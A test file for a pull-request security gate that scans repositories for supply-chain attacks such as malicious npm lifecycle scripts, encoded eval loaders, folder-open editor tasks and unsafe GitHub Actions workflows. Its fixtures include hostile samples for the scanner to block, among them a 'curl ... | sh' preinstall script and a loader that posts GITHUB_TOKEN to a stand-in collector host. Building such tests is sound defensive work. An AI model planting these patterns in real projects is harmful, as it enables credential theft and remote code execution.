import { execFileSync } from 'node:child_process';
import { access, mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import os from 'node:os';
import path from 'node:path';
import { gunzipSync, gzipSync } from 'node:zlib';
import { afterEach, describe, expect, it } from 'vitest';
import {
  buildStageAFeedback,
  currentMaintainerApproval,
  fetchCurrentMaintainerApproval,
  fetchHeadCommitVerification,
  parseStageAExceptionPolicy,
  matchingStageAExceptions,
  scanGithubPullRequest,
  scanGitTree,
  compareNpmLockfiles,
  inspectDependencyChanges,
  listPullRequestChanges,
  parseNpmLockInventory,
  inspectNpmArtifacts,
  inspectNpmTarball,
  verifyPullRequestMergeParents,
  stageAAuthorshipReviewSignals
} from '../../scripts/stage-a-gate.mjs';

const roots: string[] = [];
const markers: string[] = [];
const fakeGithubToken = ['ghp_', '123456789012345678901234567890'].join('');

function npmTarball(entries: Array<[string, string]>): Buffer {
  const blocks: Buffer[] = [];
  for (const [name, text] of entries) {
    const content = Buffer.from(text);
    const header = Buffer.alloc(512);
    header.write(name, 0, 100, 'utf8');
    header.write('0000644\0', 100, 8, 'ascii');
    header.write('0000000\0', 108, 8, 'ascii');
    header.write('0000000\0', 116, 8, 'ascii');
    header.write(
      `${content.length.toString(8).padStart(11, '0')}\0`,
      124,
      12,
      'ascii'
    );
    header.write('00000000000\0', 136, 12, 'ascii');
    header.fill(32, 148, 156);
    header[156] = 48;
    header.write('ustar\0', 257, 6, 'ascii');
    header.write('00', 263, 2, 'ascii');
    const checksum = header.reduce((total, byte) => total + byte, 0);
    header.write(
      `${checksum.toString(8).padStart(6, '0')}\0 `,
      148,
      8,
      'ascii'
    );
    blocks.push(header);
    const padded = Buffer.alloc(Math.ceil(content.length / 512) * 512);
    content.copy(padded);
    blocks.push(padded);
  }
  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks));
}

function artifact(
  archive: Buffer,
  overrides: Partial<{
    location: string;
    name: string;
    resolved: string;
    integrity: string;
    hasInstallScript: boolean;
  }> = {}
) {
  return {
    location: 'node_modules/example',
    name: 'example',
    version: '2.0.0',
    resolved: 'https://registry.npmjs.org/example/-/example-2.0.0.tgz',
    integrity: `sha512-${createHash('sha512').update(archive).digest('base64')}`,
    hasInstallScript: false,
    ...overrides
  };
}
afterEach(async () =>
  Promise.all([
    ...roots
      .splice(0)
      .map((root) => rm(root, { recursive: true, force: true })),
    ...markers.splice(0).map((marker) => rm(marker, { force: true }))
  ])
);

async function repo(
  files: Record<string, string | Buffer>
): Promise<{ root: string; sha: string }> {
  const root = await mkdtemp(path.join(os.tmpdir(), 'toolip-stage-a-'));
  roots.push(root);
  execFileSync('git', ['init', '-q', root]);
  for (const [name, value] of Object.entries(files)) {
    const target = path.join(root, name);
    await mkdir(path.dirname(target), { recursive: true });
    await writeFile(target, value);
  }
  const git = (args: string[]) =>
    execFileSync(
      'git',
      ['-C', root, '-c', 'core.hooksPath=/dev/null', ...args],
      { encoding: 'utf8' }
    ).trim();
  git(['add', '--all']);
  git([
    '-c',
    'user.name=Toolip Test',
    '-c',
    'user.email=test@example.invalid',
    'commit',
    '-qm',
    'fixture'
  ]);
  return { root, sha: git(['rev-parse', 'HEAD']) };
}

describe('trusted Stage A Git-object scanner', () => {
  it('surfaces fork, external-author, and commit-signature review requirements without treating them as malicious', async () => {
    const fork = stageAAuthorshipReviewSignals({
      authorAssociation: 'FIRST_TIME_CONTRIBUTOR',
      headRepository: 'contributor/toolip',
      headIsFork: true,
      baseRepository: 'wbizmo/toolip',
      headCommitVerification: { verified: false, reason: 'unsigned' }
    });
    expect(fork.incompleteReasons).toEqual([]);
    expect(fork.signals.map(({ id }) => id)).toEqual([
      'external-author-association',
      'fork-head-repository',
      'head-commit-signature-unverified'
    ]);
    expect(fork.signals.every((signal) => signal.reviewRequired)).toBe(true);
    expect(
      buildStageAFeedback({
        status: 'approved',
        reasonCodes: [],
        findings: [],
        reviewSignals: fork.signals
      }).sarif.runs[0]?.properties.reviewSignals
    ).toEqual(fork.signals);

    const sameRepository = stageAAuthorshipReviewSignals({
      authorAssociation: 'MEMBER',
      headRepository: 'wbizmo/toolip',
      headIsFork: false,
      baseRepository: 'wbizmo/toolip',
      headCommitVerification: { verified: true, reason: 'valid' }
    });
    expect(sameRepository).toEqual({ signals: [], incompleteReasons: [] });

    const unavailable = stageAAuthorshipReviewSignals({
      authorAssociation: undefined,
      headRepository: undefined,
      headIsFork: undefined,
      baseRepository: 'wbizmo/toolip'
    });
    expect(unavailable.incompleteReasons).toEqual([
      'head-commit-verification-unavailable',
      'pull-request-author-context-unavailable',
      'pull-request-repository-context-unavailable'
    ]);

    await expect(
      fetchHeadCommitVerification({
        repository: 'wbizmo/toolip',
        headSha: 'b'.repeat(40),
        token: 'x'.repeat(32),
        fetchImpl: async (url) => {
          expect(String(url)).toBe(
            `https://api.github.com/repos/wbizmo/toolip/commits/${'b'.repeat(40)}`
          );
          return new Response(
            JSON.stringify({
              sha: 'b'.repeat(40),
              commit: {
                verification: {
                  verified: false,
                  reason: 'unsigned',
                  signature: 'private commit signature must not escape'
                }
              }
            }),
            { status: 200 }
          );
        }
      })
    ).resolves.toEqual({ verified: false, reason: 'unsigned' });
    await expect(
      fetchHeadCommitVerification({
        repository: 'wbizmo/toolip',
        headSha: 'b'.repeat(40),
        token: 'x'.repeat(32),
        fetchImpl: async () => new Response('', { status: 302 })
      })
    ).rejects.toThrow('head-commit-verification-provider-unavailable');
    for (const payload of [
      {
        sha: 'c'.repeat(40),
        commit: { verification: { verified: true, reason: 'valid' } }
      },
      {
        sha: 'b'.repeat(40),
        commit: { verification: { verified: true, reason: 'unsigned' } }
      },
      {
        sha: 'b'.repeat(40),
        commit: { verification: { verified: false, reason: 'valid' } }
      }
    ]) {
      await expect(
        fetchHeadCommitVerification({
          repository: 'wbizmo/toolip',
          headSha: 'b'.repeat(40),
          token: 'x'.repeat(32),
          fetchImpl: async () =>
            new Response(JSON.stringify(payload), { status: 200 })
        })
      ).rejects.toThrow('head-commit-verification-response-invalid');
    }
  });

  it('accepts only exact-tree, short-lived exception entries and current maintainer approvals', async () => {
    const now = Date.parse('2026-11-07T00:00:00.000Z');
    const policy = parseStageAExceptionPolicy(
      JSON.stringify({
        version: 1,
        exceptions: [
          {
            id: 'known-false-positive',
            findingId: 'a'.repeat(64),
            headInputSha256: 'b'.repeat(64),
            expiresAt: '2026-11-20T00:00:00.000Z',
            rationale: 'Reviewed parser false positive for this exact tree.'
          },
          {
            id: 'expired-entry',
            reasonCode: 'workflow-permission-expansion-review',
            headInputSha256: 'c'.repeat(64),
            expiresAt: '2026-11-01T00:00:00.000Z',
            rationale: 'This exception is expired and must not be applied.'
          }
        ]
      }),
      now
    );
    expect(policy.invalid).toBe(false);
    expect(policy.entries.map((entry) => entry.id)).toEqual([
      'known-false-positive'
    ]);
    expect(
      parseStageAExceptionPolicy(
        JSON.stringify({
          version: 1,
          exceptions: [
            {
              id: 'too-long',
              reasonCode: 'workflow-permission-expansion-review',
              headInputSha256: 'd'.repeat(64),
              expiresAt: '2027-01-01T00:00:00.000Z',
              rationale: 'An exception that exceeds the maximum lifetime.'
            }
          ]
        }),
        now
      ).invalid
    ).toBe(true);

    const approvedReview = {
      user: { login: 'maintainer' },
      author_association: 'MEMBER',
      state: 'APPROVED',
      commit_id: 'b'.repeat(40),
      submitted_at: '2026-11-06T10:00:00Z'
    };
    expect(
      currentMaintainerApproval([approvedReview], 'b'.repeat(40), 'contributor')
    ).toMatchObject({ login: 'maintainer', commitId: 'b'.repeat(40) });
    expect(
      currentMaintainerApproval(
        [
          approvedReview,
          {
            ...approvedReview,
            state: 'CHANGES_REQUESTED',
            submitted_at: '2026-11-06T11:00:00Z'
          }
        ],
        'b'.repeat(40),
        'contributor'
      )
    ).toBeUndefined();
    expect(
      currentMaintainerApproval([approvedReview], 'b'.repeat(40), 'maintainer')
    ).toBeUndefined();

    let requestedUrl = '';
    let authorization = '';
    await expect(
      fetchCurrentMaintainerApproval({
        repository: 'wbizmo/toolip',
        number: 123,
        headSha: 'b'.repeat(40),
        pullRequestAuthor: 'contributor',
        token: 'x'.repeat(32),
        fetchImpl: async (url, options) => {
          requestedUrl = String(url);
          authorization = String(options.headers.authorization);
          return new Response(JSON.stringify([approvedReview]), {
            status: 200,
            headers: { link: '' }
          });
        }
      })
    ).resolves.toMatchObject({ login: 'maintainer' });
    expect(requestedUrl).toBe(
      'https://api.github.com/repos/wbizmo/toolip/pulls/123/reviews?per_page=100&page=1'
    );
    expect(authorization).toBe(`Bearer ${'x'.repeat(32)}`);
    await expect(
      fetchCurrentMaintainerApproval({
        repository: 'wbizmo/toolip',
        number: 123,
        headSha: 'b'.repeat(40),
        pullRequestAuthor: 'contributor',
        token: 'x'.repeat(32),
        fetchImpl: async () => new Response('', { status: 302 })
      })
    ).rejects.toThrow('maintainer-review-provider-unavailable');
  });

  it('matches reviewed exceptions for dependency artifact findings and coverage reasons only on the exact tree', () => {
    const digest = 'f'.repeat(64);
    const dependencyFinding = 'a'.repeat(64);
    const entries = [
      {
        id: 'reviewed-artifact-finding',
        findingId: dependencyFinding,
        headInputSha256: digest
      },
      {
        id: 'reviewed-artifact-lifecycle',
        reasonCode: 'dependency-lifecycle-script-review',
        headInputSha256: digest
      },
      {
        id: 'stale-artifact-finding',
        findingId: 'b'.repeat(64),
        headInputSha256: 'e'.repeat(64)
      }
    ];

    expect(
      matchingStageAExceptions(
        entries,
        digest,
        [dependencyFinding],
        ['dependency-lifecycle-script-review:node_modules/example']
      ).map(({ id }) => id)
    ).toEqual(['reviewed-artifact-finding', 'reviewed-artifact-lifecycle']);
    expect(
      matchingStageAExceptions(
        entries,
        'e'.repeat(64),
        [dependencyFinding],
        ['dependency-lifecycle-script-review:node_modules/example']
      )
    ).toEqual([]);
  });

  it('emits deterministic redacted SARIF diagnostics with concise execution traces', () => {
    const result = {
      status: 'blocked',
      reasonCodes: ['suspicious-content'],
      coverage: { files: 2 },
      findings: [
        'execution-chain:src/boot.js -> src/token.js?token=private-value',
        `src/config#npm.lifecycle:token=${fakeGithubToken}`
      ]
    };
    const feedback = buildStageAFeedback(result);
    const sarifText = JSON.stringify(feedback.sarif);

    expect(feedback.sarif.version).toBe('2.1.0');
    expect(feedback.findings).toHaveLength(2);
    expect(feedback.findings[0]?.id).toMatch(/^[a-f0-9]{64}$/u);
    expect(sarifText).not.toContain('private-value');
    expect(sarifText).not.toContain('ghp_123456789012345678901234567890');
    expect(sarifText).toContain('[redacted]');
    expect(sarifText).toContain('src/boot.js -> src/token.js');
    expect(
      buildStageAFeedback({
        ...result,
        findings: [...result.findings].reverse()
      })
    ).toEqual(feedback);
  });

  it('reports an incomplete scanner result as a stable SARIF gate error', () => {
    const first = buildStageAFeedback({
      status: 'error',
      reasonCodes: ['scanner-unavailable'],
      findings: []
    });
    const second = buildStageAFeedback({
      status: 'error',
      reasonCodes: ['scanner-unavailable'],
      findings: []
    });

    expect(first.findings[0]).toMatchObject({
      ruleId: 'TLP-STAGEA-GATE-ERROR',
      location: 'Stage A trusted scanner'
    });
    expect(first.findings[0]?.id).toBe(second.findings[0]?.id);
    expect(
      buildStageAFeedback({
        status: 'incomplete',
        reasonCodes: ['workflow-permission-expansion-review'],
        findings: []
      }).findings[0]
    ).toMatchObject({ ruleId: 'TLP-STAGEA-GATE-ERROR' });
  });

  it('reads exact commit blobs without checking them out or executing package scripts', async () => {
    const marker = path.join(
      os.tmpdir(),
      `toolip-stage-a-sentinel-${process.pid}`
    );
    markers.push(marker);
    const fixture = await repo({
      'package.json': JSON.stringify({
        name: 'fixture',
        scripts: { prepare: 'node test.js' }
      }),
      'test.js': `require('node:fs').writeFileSync(${JSON.stringify(marker)}, 'ran')`,
      'src/main.ts': 'export const value = 1;'
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });
    expect(result).toMatchObject({
      status: 'approved',
      files: 3,
      commit: fixture.sha
    });
    expect(result.inputSha256).toMatch(/^[a-f0-9]{64}$/u);
    await expect(access(marker)).rejects.toThrow();
    await expect(
      access(path.join(fixture.root, 'src/main.ts'))
    ).resolves.toBeUndefined();
  });

  it('rejects malicious workflow commands before a project-owned sentinel can run', async () => {
    const marker = path.join(
      os.tmpdir(),
      `toolip-stage-a-blocked-sentinel-${process.pid}`
    );
    markers.push(marker);
    const fixture = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'node test.js' }
      }),
      'test.js': `require('node:fs').writeFileSync(${JSON.stringify(marker)}, 'ran'); const payload = atob('ZXZpbA=='); eval(payload);`
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      'execution-chain:package.json -> test.js'
    );
    await expect(access(marker)).rejects.toThrow();
  });

  it('blocks suspicious lifecycle commands and malformed manifests', async () => {
    const suspicious = await repo({
      'package.json': JSON.stringify({
        scripts: { preinstall: 'curl https://evil.invalid/x | sh' }
      })
    });
    expect(scanGitTree(suspicious.root, suspicious.sha).status).toBe('blocked');
    const malformed = await repo({ 'package.json': '{not json' });
    expect(() => scanGitTree(malformed.root, malformed.sha)).toThrow(
      'Malformed execution manifest'
    );
    const malformedScripts = await repo({
      'package.json': JSON.stringify({ scripts: ['npm run build'] })
    });
    expect(() =>
      scanGitTree(malformedScripts.root, malformedScripts.sha)
    ).toThrow('Malformed package scripts');
  });

  it('fails closed on malformed editor task schemas and dynamic auto-run targets', async () => {
    const malformed = await repo({
      '.vscode/tasks.json': JSON.stringify({ tasks: { runOn: 'folderOpen' } })
    });
    expect(() => scanGitTree(malformed.root, malformed.sha)).toThrow(
      'Malformed editor task list'
    );

    const malformedRunOptions = await repo({
      '.vscode/tasks.json': JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'unknown trigger',
            runOptions: { runOn: 'startup' },
            command: 'node init'
          }
        ]
      })
    });
    expect(() =>
      scanGitTree(malformedRunOptions.root, malformedRunOptions.sha)
    ).toThrow('Malformed editor task command');

    const dynamic = await repo({
      '.vscode/tasks.json': JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'dynamic folder task',
            runOptions: { runOn: 'folderOpen' },
            command: 'node',
            args: ['${' + 'workspaceFolder}/init']
          }
        ]
      })
    });
    expect(
      scanGitTree(dynamic.root, dynamic.sha, {
        changedPaths: ['.vscode/tasks.json']
      })
    ).toMatchObject({
      status: 'incomplete',
      reasonCodes: ['execution-reference-coverage-incomplete']
    });
  });

  it('traces common interpreter chains to unchanged disguised blobs', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'cmd /c init.cmd' }
      }),
      'init.cmd': 'php payload.orc',
      'payload.orc': 'eval(atob(encoded_source))'
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });

    expect(result.status).toBe('blocked');
    expect(result.findings).toContain('payload.orc');
    expect(result.findings).toContain(
      'execution-chain:package.json -> init.cmd -> payload.orc'
    );
  });

  it('fails closed when the requested tree is unavailable', async () => {
    const fixture = await repo({ 'safe.txt': 'safe' });
    expect(() => scanGitTree(fixture.root, 'f'.repeat(40))).toThrow();
  });

  it('rejects invalid GitHub identities and missing read-only credentials before fetch', async () => {
    await expect(
      scanGithubPullRequest({
        repository: '../outside',
        number: 1,
        baseSha: 'a'.repeat(40),
        headSha: 'b'.repeat(40),
        mergeSha: 'c'.repeat(40),
        token: 'x'.repeat(32)
      })
    ).rejects.toThrow('GitHub repository identity is invalid');
    await expect(
      scanGithubPullRequest({
        repository: 'wbizmo/toolip',
        number: 1,
        baseSha: 'a'.repeat(40),
        headSha: 'b'.repeat(40),
        mergeSha: 'c'.repeat(40),
        token: ''
      })
    ).rejects.toThrow('Read-only GitHub token is unavailable');
  });

  it('binds the scanned immutable merge tree to the event base and PR head', async () => {
    const fixture = await repo({ 'base.txt': 'base' });
    const git = (args: string[]) =>
      execFileSync('git', ['-C', fixture.root, ...args], {
        encoding: 'utf8'
      }).trim();
    git(['checkout', '-qb', 'feature']);
    await writeFile(path.join(fixture.root, 'head.txt'), 'head');
    git(['add', 'head.txt']);
    git([
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'head'
    ]);
    const head = git(['rev-parse', 'HEAD']);
    git(['checkout', '-q', fixture.sha]);
    git([
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'merge',
      '--no-ff',
      '--no-edit',
      'feature'
    ]);
    const merge = git(['rev-parse', 'HEAD']);
    expect(() =>
      verifyPullRequestMergeParents(fixture.root, merge, fixture.sha, head)
    ).not.toThrow();
    expect(() =>
      verifyPullRequestMergeParents(
        fixture.root,
        merge,
        fixture.sha,
        'd'.repeat(40)
      )
    ).toThrow('does not contain');
  });

  it('blocks untrusted event interpolation in GitHub Actions shell steps', async () => {
    const fixture = await repo({
      '.github/workflows/ci.yml': [
        'name: unsafe',
        'on: pull_request_target',
        'jobs:',
        '  test:',
        '    steps:',
        '      - run: echo "$' + '{' + '{ github.event.issue.title }}"'
      ].join('\n')
    });
    expect(scanGitTree(fixture.root, fixture.sha)).toMatchObject({
      status: 'blocked'
    });
  });

  it('blocks changed workflows with mutable actions and requires review for write permissions', async () => {
    const mutable = await repo({ 'safe.txt': 'safe' });
    const workflow = [
      'name: check',
      'on: pull_request',
      'permissions:',
      '  contents: read',
      'jobs:',
      '  test:',
      '    steps:',
      '      - name: checkout',
      '        uses: actions/checkout@v4'
    ].join('\n');
    await mkdir(path.join(mutable.root, '.github/workflows'), {
      recursive: true
    });
    await writeFile(
      path.join(mutable.root, '.github/workflows/ci.yml'),
      workflow
    );
    execFileSync('git', ['-C', mutable.root, 'add', '--all']);
    execFileSync('git', [
      '-C',
      mutable.root,
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'add mutable workflow action'
    ]);
    const mutableHead = execFileSync(
      'git',
      ['-C', mutable.root, 'rev-parse', 'HEAD'],
      { encoding: 'utf8' }
    ).trim();
    const mutableResult = scanGitTree(mutable.root, mutableHead, {
      changedPaths: ['.github/workflows/ci.yml']
    });
    expect(mutableResult.status).toBe('blocked');
    expect(mutableResult.findings).toContain(
      '.github/workflows/ci.yml#unpinned-action'
    );

    const writable = await repo({
      '.github/workflows/ci.yml': [
        'name: check',
        'on: pull_request',
        'permissions:',
        '  contents: write',
        'jobs:',
        '  test:',
        '    steps:',
        '      - name: checkout',
        '        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1'
      ].join('\n')
    });
    expect(
      scanGitTree(writable.root, writable.sha, {
        changedPaths: ['.github/workflows/ci.yml']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'workflow-permission-expansion-review',
        'workflow-trust-root-change-review'
      ]
    });

    const localAction = await repo({
      '.github/workflows/ci.yml': [
        'name: check',
        'on: pull_request',
        'jobs:',
        '  test:',
        '    steps:',
        '      - name: local action',
        '        uses: ./actions/build'
      ].join('\n')
    });
    expect(
      scanGitTree(localAction.root, localAction.sha, {
        changedPaths: ['.github/workflows/ci.yml']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'workflow-local-action-review',
        'workflow-trust-root-change-review'
      ]
    });

    const dockerAction = await repo({
      '.github/workflows/ci.yml': [
        'name: check',
        'on: pull_request',
        'jobs:',
        '  test:',
        '    steps:',
        '      - name: container action',
        '        uses: docker://alpine:3'
      ].join('\n')
    });
    expect(
      scanGitTree(dockerAction.root, dockerAction.sha, {
        changedPaths: ['.github/workflows/ci.yml']
      })
    ).toMatchObject({
      status: 'blocked',
      findings: ['.github/workflows/ci.yml#unpinned-action']
    });

    const privilegedTrigger = await repo({
      '.github/workflows/ci.yml': [
        'name: check',
        'on: pull_request_target',
        'permissions: read-all',
        'jobs:',
        '  test:',
        '    steps:',
        '      - name: checkout',
        '        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1'
      ].join('\n')
    });
    expect(
      scanGitTree(privilegedTrigger.root, privilegedTrigger.sha, {
        changedPaths: ['.github/workflows/ci.yml']
      })
    ).toMatchObject({
      status: 'blocked',
      findings: ['.github/workflows/ci.yml#privileged-pull-request-trigger']
    });
  });

  it('requires review when a Stage A scanner, verifier or trust-root workflow changes', async () => {
    const workflow = await repo({
      '.github/workflows/stage-a.yml': [
        'name: trusted gate',
        'on: pull_request_target',
        'permissions:',
        '  contents: read',
        'jobs: {}'
      ].join('\n')
    });
    expect(
      scanGitTree(workflow.root, workflow.sha, {
        changedPaths: ['.github/workflows/stage-a.yml']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['workflow-trust-root-change-review']
    });

    const codeowners = await repo({
      '.github/CODEOWNERS': '/.github/workflows/ @wbizmo\n'
    });
    expect(
      scanGitTree(codeowners.root, codeowners.sha, {
        changedPaths: ['.github/CODEOWNERS']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['workflow-trust-root-change-review']
    });

    const scanner = await repo({
      'scripts/stage-a-gate.mjs': 'export const reviewed = true;\n'
    });
    expect(
      scanGitTree(scanner.root, scanner.sha, {
        changedPaths: ['scripts/stage-a-gate.mjs']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['workflow-trust-root-change-review']
    });

    const parser = await repo({
      'vendor/stage-a-yaml-parser.mjs': 'export const reviewed = true;\n'
    });
    expect(
      scanGitTree(parser.root, parser.sha, {
        changedPaths: ['vendor/stage-a-yaml-parser.mjs']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['workflow-trust-root-change-review']
    });

    const verifier = await repo({
      'scripts/verify-node.mjs': 'process.exit(0);\n'
    });
    expect(
      scanGitTree(verifier.root, verifier.sha, {
        changedPaths: ['scripts/verify-node.mjs']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['workflow-trust-root-change-review']
    });
  });

  it('requires review when a trusted workflow is deleted from the candidate tree', async () => {
    const fixture = await repo({
      '.github/workflows/ci.yml': [
        'name: ci',
        'on: push',
        'permissions:',
        '  contents: read',
        'jobs: {}'
      ].join('\n')
    });
    await rm(path.join(fixture.root, '.github/workflows/ci.yml'));
    execFileSync('git', ['-C', fixture.root, 'add', '--all']);
    execFileSync('git', [
      '-C',
      fixture.root,
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'remove CI trust root'
    ]);
    const head = execFileSync(
      'git',
      ['-C', fixture.root, 'rev-parse', 'HEAD'],
      { encoding: 'utf8' }
    ).trim();
    const changedPaths = listPullRequestChanges(
      fixture.root,
      fixture.sha,
      head
    );

    expect(changedPaths).toContain('.github/workflows/ci.yml');
    expect(scanGitTree(fixture.root, head, { changedPaths })).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'workflow-trust-root-removal-review:.github/workflows/ci.yml'
      ]
    });
  });

  it('traces automatic editor tasks through extensionless loaders without executing them', async () => {
    const fixture = await repo({
      '.vscode/tasks.json': JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'workspace bootstrap',
            runOptions: { runOn: 'folderOpen' },
            command: 'node',
            args: ['init']
          }
        ]
      }),
      init: 'const payload = atob("cHJvY2Vzcy5lbnY="); eval(payload);'
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['.vscode/tasks.json']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toEqual(
      expect.arrayContaining([
        expect.stringContaining('init'),
        expect.stringContaining('execution-chain:.vscode/tasks.json -> init')
      ])
    );
  });

  it('traces an encoded ESLint config loader into an extensionless target', async () => {
    const fixture = await repo({
      'eslint.config.js':
        "import './init';\nconst payload = atob(encoded); eval(payload);",
      init: "const payload = atob(encoded); eval(payload); fetch('https://collector.invalid', { body: process.env.GITHUB_TOKEN });"
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['eslint.config.js']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toEqual(
      expect.arrayContaining([
        expect.stringContaining('eslint.config.js'),
        expect.stringContaining('execution-chain:eslint.config.js -> init')
      ])
    );
    expect(JSON.stringify(result.findings)).not.toContain(
      'https://collector.invalid'
    );
    expect(JSON.stringify(result.findings)).not.toContain('GITHUB_TOKEN');
  });

  it('approves benign editor and package tasks without classifying automation alone as malicious', async () => {
    const fixture = await repo({
      '.vscode/tasks.json': JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'build workspace',
            runOptions: { runOn: 'folderOpen' },
            command: 'npm',
            args: ['run', 'build']
          }
        ]
      }),
      'package.json': JSON.stringify({
        scripts: { build: 'tsc --noEmit', test: 'vitest run' }
      }),
      'src/index.ts': 'export const ready = true;\n'
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['.vscode/tasks.json']
    });
    expect(result.status).toBe('approved');
    expect(result.findings).toEqual([]);
  });

  it('traces workflow package scripts to unchanged local loaders', async () => {
    const fixture = await repo({
      '.github/workflows/build.yml': [
        'name: build',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        '      - run: npm run prepare'
      ].join('\n'),
      'package.json': JSON.stringify({
        scripts: { prepare: 'node init' }
      }),
      init: 'const payload = atob("cHJvY2Vzcy5lbnY="); eval(payload);'
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['.github/workflows/build.yml']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      'execution-chain:.github/workflows/build.yml -> package.json -> init'
    );
  });

  it('traces block-form workflow commands into exact workspace package scripts', async () => {
    const fixture = await repo({
      '.github/workflows/build.yml': [
        'name: build',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        '      - name: workspace script',
        '        working-directory: packages/app',
        '        run: |',
        '          pnpm --filter @fixture/app run prepare'
      ].join('\n'),
      'package.json': JSON.stringify({
        name: 'fixture-root',
        workspaces: ['packages/*']
      }),
      'packages/app/package.json': JSON.stringify({
        name: '@fixture/app',
        scripts: { prepare: 'node scripts/bootstrap' }
      }),
      'packages/app/scripts/bootstrap':
        'const payload = atob("cHJvY2Vzcy5lbnY="); eval(payload);\n'
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['.github/workflows/build.yml']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      'execution-chain:.github/workflows/build.yml -> packages/app/package.json -> packages/app/scripts/bootstrap'
    );
  });

  it('applies job default working directories to package script chains', async () => {
    const fixture = await repo({
      '.github/workflows/build.yml': [
        'name: build',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    defaults:',
        '      run:',
        '        working-directory: ./packages/app',
        '    steps:',
        '      - run: |',
        '          npm run prepare'
      ].join('\n'),
      'packages/app/package.json': JSON.stringify({
        name: '@fixture/app',
        scripts: { prepare: 'node init' }
      }),
      'packages/app/init':
        'const payload = atob("cHJvY2Vzcy5lbnY="); eval(payload);\n'
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['.github/workflows/build.yml']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      'execution-chain:.github/workflows/build.yml -> packages/app/package.json -> packages/app/init'
    );
  });

  it('marks dynamic workflow working directories incomplete', async () => {
    const fixture = await repo({
      '.github/workflows/build.yml': [
        'name: build',
        'on: pull_request',
        'defaults:',
        '  run:',
        `    working-directory: \${{ inputs.package }}`,
        'jobs:',
        '  build:',
        '    steps:',
        '      - run: npm run prepare'
      ].join('\n'),
      'package.json': JSON.stringify({ scripts: { prepare: 'node init' } }),
      init: 'export const safe = true;\n'
    });
    expect(
      scanGitTree(fixture.root, fixture.sha, {
        changedPaths: ['.github/workflows/build.yml']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['execution-reference-coverage-incomplete']
    });
  });

  it('follows automatic editor-task dependencies and workspace-relative commands', async () => {
    const fixture = await repo({
      '.vscode/tasks.json': JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'open workspace',
            runOptions: { runOn: 'folderOpen' },
            dependsOn: 'bootstrap'
          },
          {
            label: 'bootstrap',
            command: 'node',
            args: ['init'],
            options: { cwd: 'packages/app' }
          }
        ]
      }),
      'packages/app/init':
        'const payload = atob("cHJvY2Vzcy5lbnY="); eval(payload);\n'
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['.vscode/tasks.json']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      'execution-chain:.vscode/tasks.json -> packages/app/init'
    );
  });

  it('marks unresolved workspace filters and interpolation in block runs incomplete', async () => {
    const fixture = await repo({
      '.github/workflows/build.yml': [
        'name: build',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        '      - run: |',
        `          pnpm --filter "\${{ inputs.workspace }}" run build`,
        `          echo "\${{ github.event.pull_request.title }}"`
      ].join('\n'),
      'package.json': JSON.stringify({ name: 'fixture-root' })
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['.github/workflows/build.yml']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      '.github/workflows/build.yml#untrusted-event-shell-interpolation'
    );
    expect(result.incompleteReasons).toContain(
      'execution-reference-coverage-incomplete'
    );
  });

  it('fails closed on malformed changed workflow YAML', async () => {
    const fixture = await repo({
      '.github/workflows/build.yml': [
        'name: build',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        '      - run: "node init'
      ].join('\n')
    });
    expect(() =>
      scanGitTree(fixture.root, fixture.sha, {
        changedPaths: ['.github/workflows/build.yml']
      })
